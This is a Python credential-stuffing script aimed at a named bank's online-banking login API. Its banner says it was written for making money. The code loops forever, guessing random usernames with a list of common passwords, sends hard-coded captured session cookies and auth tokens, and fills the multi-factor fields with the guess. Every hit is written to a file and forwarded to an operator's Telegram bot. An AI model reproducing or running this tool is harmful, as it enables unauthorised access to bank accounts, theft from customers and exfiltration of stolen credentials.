import requests
from rich.console import Console
from rich.panel import Panel
from rich.box import SIMPLE_HEAVY
from faker import Faker
import random
import time
from pyfiglet import figlet_format
import sys
from rich.text import Text
from pyfiglet import figlet_format
console = Console()
signature = figlet_format("By\nVermouth", font="slant")
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
console = Console()
text = Text(
    "𝖳𝖧𝖨𝖲 𝖲𝖢𝖱𝖨𝖯𝖳 𝖶𝖠𝖲 𝖢𝖱𝖤𝖠𝖳𝖤𝖣 𝖥𝖮𝖱 𝖳𝖧𝖤 𝖯𝖴𝖱𝖯𝖮𝖲𝖤 𝖮𝖥 𝖤𝖭𝖩𝖮𝖸𝖨𝖭𝖦 𝖬𝖮𝖭𝖤𝖸 𝖠𝖭𝖣 𝖨 𝖣𝖮 𝖭𝖮𝖳 𝖢𝖠𝖱𝖤 𝖠𝖡𝖮𝖴𝖳 𝖳𝖧𝖤 𝖶𝖤𝖲𝖳, 𝖲𝖮 𝖨𝖳 𝖶𝖠𝖲 𝖯𝖱𝖮𝖦𝖱𝖠𝖬𝖬𝖤𝖣 𝖡𝖸 𝖵𝖤𝖱𝖬𝖮𝖴𝖳𝖧.",
    style="color(88)" 
)
console.print(
    Panel(
        text,
        border_style="green"
    )
)
console.print(Panel(signature, box=SIMPLE_HEAVY), style="bold #50C878")
bot_token = input("\x1b[38;5;7m      Bot token: ")
chat_id = input("\x1b[38;5;7m     Telegram chat ID: ")
def send_telegram_message(message):
    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message}
    try:
        requests.post(telegram_url, json=payload)
    except requests.RequestException as e:
        console.print(f"[red]Failed to send message to Telegram: {e}[/red]")
faker = Faker()
passwords = [
    "1234567890", "1234512345", "12341234", "12344321", "1234554321",
    "Qwertyuiop", "Qwert12345", "12345qwert", "19901990", "19911991",
    "19921992", "19931993", "19941994", "19951995", "19961996",
    "19971997", "19981998", "19991999", "20002000", "078078078",
    "077077077", "07800780", "19901990@", "19911991@", "19921992@",
    "19931993@", "19941994@", "19951995@", "19961996@", "19971997@",
    "19981998@", "19991999@", "Asdfg12345@@", "Zxcvb12345@@", 
    "Qqwweerr12345", "Aassddff1234"
]

url = "https://online.creditbankofiraq.com.iq/platform-web/odata/ns/authenticationservice/SecureUsers?action=validateMFA"

headers = {
    "Host": "online.creditbankofiraq.com.iq",
    "Connection": "keep-alive",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "Accept-Language": "en",
    "Authorization": "Basic aWJnZWZzOm5iay5pYmdlZnM=",
    "sap-cancel-on-close": "false",
    "sap-contextid-accept": "header",
    "TokenKey": "RkZJSEFTSFlMQWVrOGRNTVVuc0tBdmhxa1BqUEdrN1RsNEtGVktLZmlMZHhxSXZYS2s9",
    "sec-ch-ua-platform": '"Android"',
    "Pragma": "no-cache",
    "RefreshCSRFToken": "1942263497075645671",
    "MaxDataServiceVersion": "2.0",
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Cache-Control": "no-cache,no-store,must-revalidate",
    "DataServiceVersion": "2.0",
    "channelType": "Web",
    "Expires": "-1",
    "Origin": "https://online.creditbankofiraq.com.iq",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://online.creditbankofiraq.com.iq/ocb/main.html?ts=1724736797440",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Cookie": "JSESSIONID=0001HN1-__9b757CGJjRI29E32N:26F337P00K; NK5af42751=5a23f0f79ff098183bc61057d7709d1a23989db5efbb489744670dcdeae3d3c9f96291926c9a7b9ec3ecf0eabacfd385a1adecbe350d8f24d14a7928fc452c38e6b73efe411c627b8a27fa38e440438d663c2a83d188f9d93c316fe71f61d5c8dae57e3db2; WAF=!q77W9srdv9VijSvQ8BjUkls1W543KIFAwQBi0qphJaWJ0h9jbuGr6EMi/ePQBK6dU+UyCKvWfgLpzcxkhzy3GxnOrMqvWzwIm2fx096XGvK12w==; LtpaToken2=iR+X9nUV3ErDnAYhCeuvwqjvpu5Vbmhd+4tzU/tWcHLRPTsmSZosu6cDHYbVixPc+iRLPtPKzSMzUJzGWv3VcJB14a75bAle5IVtGM8yCZMRFyNbxrDIF58iZVy8JpOJTE4BNKT+P4UGZ3BTeQdqV1vK8m0fCs7XxazsYJ9gcQYDArxRFtbQuhM3Oe79g85mVzZSyogCqDDknNi48eQuuWeRmzwVj0Jt10ksrgjorMcrIHON2NmSKCdlVRVhO2MtoaRjHbI+pyxoT+9samgGxCufQo3haylr/105SoGjqy2HLUg3mS+6Ui14e7T90mqgkf4QCNJKCbg4aVsJNCP1YbbTARteF2m4E/ojYBuhPsuW+rbMqwyfOMiW0BMobKjECbOjwyroQUX0Qb0VuTResL/5905LXN0w/07rJOkUwhJtx99N+6BmWJ5XUF0C4YbSKRl3jdRcqtNOhc9K3k7lwKjqWF3MLRqxrGtcPkxZeQyI5bF3j1RUM/+dqV0h7fFTsH9hQX/DvJf8VXqdpvopjg8TFJqtkSZx9YKFCuKPFl9GdzCNWH0yPnPAbB4U6V22PsahDF4BbaKvJPO30d5I2mlk+Dk8AiaOOdkwNx92MfIFh43U2CZdESXatbwbFisFkpcwJfiCBxw2J7wzeZVC2A==; NK5a2104df=5a23f0f79f10bebdbd9ebe19aad3f172b9a0c9adebbb489744670dcdeae3d3c9f96291926c9a7b9ec3ecf0eabacfd385a1adecbe356101f4d2330399edc03dbd0809b24481cb8b2efca8fe802d6f7f2eaa21c9124a",
}

output_file = "successful_logins.txt"

while True:
    username = ''.join(random.choices(faker.first_name().replace(' ', '') + faker.last_name().replace(' ', ''), k=10))
    password = random.choice(passwords)

    payload = {
        "Id": username,
        "MultifactorInfo": [
            {
                "__metadata": {
                    "id": "https://online.creditbankofiraq.com.iq:443/platform-web/odata/ns/authenticationservice/MultifactorInfos('123')",
                    "uri": "https://online.creditbankofiraq.com.iq:443/platform-web/odata/ns/authenticationservice/MultifactorInfos('123')",
                    "type": "com.sap.banking.authentication.endpoint.v1_0.beans.MultifactorInfo"
                },
                "Challenge": "12",
                "Id": "123",
                "Response": password,
                "Type": 4
            },
            {
                "__metadata": {
                    "id": "https://online.creditbankofiraq.com.iq:443/platform-web/odata/ns/authenticationservice/MultifactorInfos('1')",
                    "uri": "https://online.creditbankofiraq.com.iq:443/platform-web/odata/ns/authenticationservice/MultifactorInfos('1')",
                    "type": "com.sap.banking.authentication.endpoint.v1_0.beans.MultifactorInfo"
                },
                "Challenge": "13",
                "Id": "1",
                "Response": password,
                "Type": 4
            }
        ],
        "MfaRequired": "0",
        "Password": password,
        "User": username
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        response_data = response.json()
        if response_data.get("status") == "success":
            console.print(f"[green]Successful login with username: {username} and password: {password}[/green]")
            send_telegram_message(f"Successful login with username: {username} and password: {password}")
            with open(output_file, "a") as file:
                file.write(f"Username: {username}, Password: {password}\n")
        else:
            console.print(f"[red]Failed login with username: {username} and password: {password}[/red]")
    except Exception as e:
        console.print(f"[red]An error occurred: {e}[/red]")

    time.sleep(1)
